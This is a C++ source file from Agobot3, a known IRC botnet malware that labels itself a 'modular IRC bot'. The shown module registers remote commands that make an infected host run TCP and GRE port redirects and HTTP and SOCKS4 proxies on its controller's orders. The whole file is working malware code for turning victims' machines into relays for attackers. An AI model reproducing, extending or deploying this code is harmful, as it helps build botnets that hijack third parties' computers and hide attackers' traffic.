/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redirect.h"
#include "mainctrl.h"
#include "redir_tcp.h"
#include "redir_gre.h"
#include "redir_http.h"
#include "redir_socks.h"

void CRedirect::Init()
{	m_iNumThreads=0; m_bRedirecting=false;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdTCP,		"redirect.tcp",		"starts a tcp port redirect",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGRE,		"redirect.gre",		"starts a gre redirect",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdHTTP,		"redirect.http",	"starts a http proxy",			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSOCKS,	"redirect.socks",	"starts a socks4 proxy",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		"redirect.stop",	"stops all redirects running",	this); }

/*
	.redirect.tcp <localport> <remote> <remoteport>
	.redirect.gre <host> <client> [localip]
	.redirect.http <localport> <ssl>
	.redirect.socks <localport>
*/

bool CRedirect::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("redirect.tcp"))
	{	CRedirectTCP *pTemp=new CRedirectTCP; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_sRemoteAddr.Assign(pMsg->sChatString.Token(2, " "));
		pTemp->m_iRemotePort=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("redirect.gre"))
	{	CRedirectGRE *pTemp=new CRedirectGRE; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_sServerAddr.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_sClientAddr.Assign(pMsg->sChatString.Token(2, " "));
		pTemp->m_sLocalAddr.Assign(pMsg->sChatString.Token(3, " "));
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("redirect.http"))
	{	CRedirectHTTP *pTemp=new CRedirectHTTP; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		if(!pMsg->sChatString.Token(2, " ").CompareNoCase("true"))
			pTemp->m_bUseSSL=true; else pTemp->m_bUseSSL=false;
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("redirect.socks"))
	{	CRedirectSOCKS *pTemp=new CRedirectSOCKS; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("redirect.stop")) m_bRedirecting=false;

	return true; }

void *CRedirectBase::Run()
{	if(!(g_cMainCtrl.m_cBot.redir_maxthreads.iValue<m_pRedirect->m_iNumThreads))
		m_pRedirect->m_iNumThreads++; StartRedirect(); m_pRedirect->m_iNumThreads--;
	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
